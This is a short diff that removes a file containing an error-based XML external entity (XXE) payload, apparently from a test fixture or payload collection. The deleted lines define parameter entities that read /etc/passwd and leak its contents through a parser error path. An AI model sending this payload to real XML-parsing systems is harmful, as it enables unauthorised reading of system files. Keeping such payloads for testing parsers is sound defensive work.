@@ -1,4 +1,0 @@
-<!ENTITY % secret SYSTEM "file:///etc/passwd">
-<!ENTITY % trick "<!ENTITY &#x25; err SYSTEM 'file:///dummyJ0dummy/%secret;'>">
-%trick;
-%err;
